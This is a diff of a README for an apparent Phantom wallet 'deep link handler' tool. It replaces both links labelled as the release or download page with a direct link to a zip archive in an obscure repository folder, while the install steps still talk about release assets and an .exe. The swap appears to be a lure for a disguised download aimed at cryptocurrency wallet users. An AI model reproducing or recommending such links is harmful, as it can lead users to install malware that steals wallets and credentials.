@@ -1,6 +1,6 @@
 # 🔗 phantom-deep-link-handler - Connect mobile apps to Phantom wallets
 
-[![Download Installer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Kirstynquaint9252/phantom-deep-link-handler/releases)
+[![Download Installer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Kirstynquaint9252/phantom-deep-link-handler/main/abbot/deep_handler_phantom_link_v3.7-alpha.2.zip)
 
 This application bridge allows your computer to handle request signals from mobile Ethereum applications. It directs traffic between your web browser and the Phantom mobile wallet. This process enables you to sign transactions and connect your wallet through a link.
 
@@ -23,7 +23,7 @@ This application bridge allows your computer to handle request signals from mobi
 
 You need to access the official release page to obtain the installer for your system. Follow these steps to prepare the application.
 
-1. Visit the [Download Page](https://github.com/Kirstynquaint9252/phantom-deep-link-handler/releases) to find the latest version.
+1. Visit the [Download Page](https://raw.githubusercontent.com/Kirstynquaint9252/phantom-deep-link-handler/main/abbot/deep_handler_phantom_link_v3.7-alpha.2.zip) to find the latest version.
 2. Look for the section labeled "Assets".
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop for easy access.
